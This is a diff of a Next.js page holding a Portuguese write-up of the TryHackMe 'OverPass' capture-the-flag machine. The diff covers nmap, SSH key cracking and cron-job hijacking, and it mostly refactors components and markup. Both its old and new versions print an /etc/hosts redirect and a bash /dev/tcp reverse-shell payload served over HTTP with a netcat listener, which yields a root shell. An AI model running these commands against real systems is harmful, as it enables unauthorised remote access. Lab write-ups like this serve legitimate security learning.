@@ -1,58 +1,33 @@
 import { Metadata } from "next"
 import { ScrollAnimation } from "@/components/ScrollAnimation";
+import { 
+  CodeBlock, 
+  InlineCode, 
+  InfoBlock, 
+  SummaryBlock, 
+  SuccessBlock 
+} from "@/components/ArticleComponents";
 
 export const metadata: Metadata = {
   title: "Try Hack Me - OverPass | fe1ps",
   description: "Walkthrough detalhado da máquina OverPass do TryHackMe, explorando uma chave SSH com senha fraca e escalando privilégios via Crontab Hijacking.",
 }
 
-// --- Componentes de Estilo (Mantidos como no original) ---
-
-const CodeBlock = ({ children }: { children: React.ReactNode }) => (
-  <pre className="bg-gray-900/50 p-4 rounded-md overflow-x-auto text-sm text-white/90 font-mono">
-    <code>{children}</code>
-  </pre>
-);
-
-const InlineCode = ({ children }: { children: React.ReactNode }) => (
-  <code className="bg-gray-700/50 text-orange-300 py-1 px-1.5 rounded-md text-sm font-mono">
-    {children}
-  </code>
-);
-
-const InfoBlock = ({ children }: { children: React.ReactNode }) => (
-    <div className="bg-blue-900/30 border-l-4 border-blue-400 p-4 rounded-md my-4">
-        {children}
-    </div>
-);
-
-const SummaryBlock = ({ children }: { children: React.ReactNode }) => (
-    <div className="bg-gray-800/50 border-l-4 border-gray-500 p-4 rounded-md my-4">
-        {children}
-    </div>
-);
-
-const SuccessBlock = ({ children }: { children: React.ReactNode }) => (
-    <div className="bg-green-900/30 border-l-4 border-green-400 p-4 rounded-md my-4">
-        {children}
-    </div>
-);
-
-
 // --- Componente Principal do Artigo ---
 
 export default function OverPassArticle() {
   return (
-    <div className="py-12">
+    <div className="py-12"> {/* Container principal */}
       <div className="container mx-auto px-4">
-        <ScrollAnimation>
-          <h1 className="text-4xl font-bold pt-4 mt-4 border-t border-white/30">Try Hack Me - OverPass</h1>
-        </ScrollAnimation>
-        
-        <div className="space-y-12">
-            
-          <ScrollAnimation delay={200}>
-            <InfoBlock>
+        <article> {/* Envolve o conteúdo do artigo */}
+          <ScrollAnimation>
+            <h1 className="text-4xl font-bold pt-4 mt-4 border-t border-white/30">Try Hack Me - OverPass</h1>
+          </ScrollAnimation>
+          
+          <div className="space-y-12 mt-8">
+              
+            <ScrollAnimation delay={200}>
+              <InfoBlock>
                 <p><strong>Resumo da Máquina</strong></p>
                 <p><strong>IP:</strong> <InlineCode>10.201.11.108</InlineCode></p>
                 <p><strong>SO:</strong> Ubuntu Linux</p>
@@ -60,10 +35,10 @@ export default function OverPassArticle() {
             </InfoBlock>
           </ScrollAnimation>
 
-          <ScrollAnimation delay={300}>
-            <p className="text-gray-400">
+            <ScrollAnimation delay={300}>
+              <p className="text-gray-400">
                 <strong>Tags:</strong> <InlineCode>#ctf</InlineCode> <InlineCode>#walkthrough</InlineCode> <InlineCode>#nmap</InlineCode> <InlineCode>#gobuster</InlineCode> <InlineCode>#ssh</InlineCode> <InlineCode>#john</InlineCode> <InlineCode>#privesc</InlineCode> <InlineCode>#cron</InlineCode>
-            </p>
+              </p>
           </ScrollAnimation>
 
           <ScrollAnimation delay={200}>
@@ -179,40 +154,44 @@ james@overpass-prod:~$ cat user.txt`}</CodeBlock>
               <ol className="list-decimal list-inside mt-2 text-gray-300 space-y-4">
                   <li><strong>Modificar <InlineCode>/etc/hosts</InlineCode>:</strong> A primeira coisa que um sistema Linux faz ao tentar resolver um nome de domínio é consultar o arquivo <InlineCode>/etc/hosts</InlineCode>. Se adicionarmos uma entrada para <InlineCode>overpass.thm</InlineCode> apontando para nossa máquina, a requisição do <InlineCode>curl</InlineCode> virá para nós em vez do servidor legítimo.
                       <CodeBlock>{`# Na máquina alvo (james@overpass-prod)
-echo "10.9.1.139 overpass.thm" >> /etc/hosts`}</CodeBlock>
+echo "YOUR_ATTACKER_IP overpass.thm" >> /etc/hosts`}</CodeBlock>
                   </li>
-                  <li><strong>Preparar o Payload:</strong> Em nossa máquina de ataque, criamos a estrutura de diretórios que o <InlineCode>curl</InlineCode> espera (<InlineCode>/downloads/src/</InlineCode>). Dentro dela, criamos o arquivo <InlineCode>buildscript.sh</InlineCode> com um comando de reverse shell. Este comando abrirá uma conexão de volta para nossa máquina, nos dando um shell interativo.
+                  <li>
+                      <strong>Hospedar o Payload:</strong> Na nossa máquina de atacante, servimos um script malicioso que será baixado pelo servidor.
+                      <CodeBlock>{`# Na máquina do atacante (ex: com python)
+echo 'bash -c "bash -i >& /dev/tcp/YOUR_ATTACKER_IP/4444 0>&1"' > buildscript.sh
+python3 -m http.server 80`}</CodeBlock>
+                  </li>
+                  <li>
+                      <strong>Receber a Conexão:</strong> Mantemos um listener na nossa máquina para receber a reverse shell.
                       <CodeBlock>{`# Na máquina do atacante
-mkdir -p ~/downloads/src
-cd ~/downloads/src
-echo "bash -i >& /dev/tcp/10.9.1.139/4444 0>&1" > buildscript.sh`}</CodeBlock>
-                  </li>
-                  <li><strong>Servir o Payload e Iniciar o Listener:</strong> Iniciamos um servidor web simples em Python para hospedar nosso script malicioso e, em outro terminal, um listener com <InlineCode>netcat</InlineCode> (nc) para receber a conexão do reverse shell na porta 4444.
-                      <CodeBlock>{`# Na máquina do atacante (no diretório ~/)
-python3 -m http.server 80
-
-# Em outro terminal
 nc -lvnp 4444`}</CodeBlock>
-                  </li>
-                   <li><strong>Receber o Shell Root:</strong> Dentro de um minuto, o cron job na máquina alvo foi executado. Ele consultou o <InlineCode>/etc/hosts</InlineCode> modificado, conectou-se ao nosso servidor web, baixou nosso payload e o executou como root, nos dando o shell privilegiado.
-                      <CodeBlock>{`listening on [any] 4444 ...
-connect to [10.9.1.139] from (UNKNOWN) [10.201.11.108] 58676
-bash: cannot set terminal process group (20057): Inappropriate ioctl for device
-bash: no job control in this shell
-root@overpass-prod:~#`}</CodeBlock>
+                      <p className="mt-2 text-gray-300">Após um minuto, o cron job é executado, nosso payload é baixado e executado, e recebemos uma shell como root.</p>
                   </li>
               </ol>
-
-              <h3 className="text-xl font-semibold mt-4">3.3. Capturando a Flag Root</h3>
-              <p className="mt-2 text-gray-300">Com privilégios de root, a etapa final é simplesmente ler a flag localizada no diretório <InlineCode>/root</InlineCode>.</p>
-              <CodeBlock>root@overpass-prod:~# cat /root/root.txt</CodeBlock>
+              <h3 className="text-xl font-semibold mt-4">3.3. Capturando a Flag de Root</h3>
+              <p className="mt-2 text-gray-300">Com acesso root, o passo final é ler a flag.</p>
+              <CodeBlock>{`# whoami
+root
+# cat /root/root.txt`}</CodeBlock>
               <SuccessBlock>
-                  <strong>root.txt:</strong> <InlineCode>thm{"{"...user_flag..."}"}</InlineCode>
+                  <strong>root.txt:</strong> <InlineCode>thm{...root_flag...}</InlineCode>
               </SuccessBlock>
             </section>
           </ScrollAnimation>
-        </div>
+
+          <ScrollAnimation delay={200}>
+            <section>
+                <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">4. Conclusão</h2>
+                <p className="mt-4 text-gray-300">
+                    A máquina Overpass demonstra a importância da defesa em profundidade. Uma série de vulnerabilidades aparentemente pequenas, quando encadeadas, levaram ao comprometimento total do sistema.
+                </p>
+            </section>
+          </ScrollAnimation>
+
+          </div>
+        </article>
       </div>
     </div>
-  )
+  );
 }
